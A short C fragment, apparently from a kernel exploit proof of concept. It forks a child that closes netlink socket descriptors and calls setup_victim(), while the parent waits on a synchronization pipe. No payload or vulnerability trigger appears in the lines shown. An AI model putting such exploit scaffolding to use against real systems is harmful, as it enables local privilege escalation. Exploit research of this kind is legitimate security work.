	child = fork();
	if (child < 0)
		die_errno("fork");
	if (child == 0) {
		close(ready[0]);
		close(go[1]);
		close(genl);
		close(rtnl);
		setup_victim(anchor_fd, ready[1], go[0]);
	}

	close(ready[1]);
	close(go[0]);
	if (read(ready[0], &byte, 1) != 1)
		die_errno("ready");
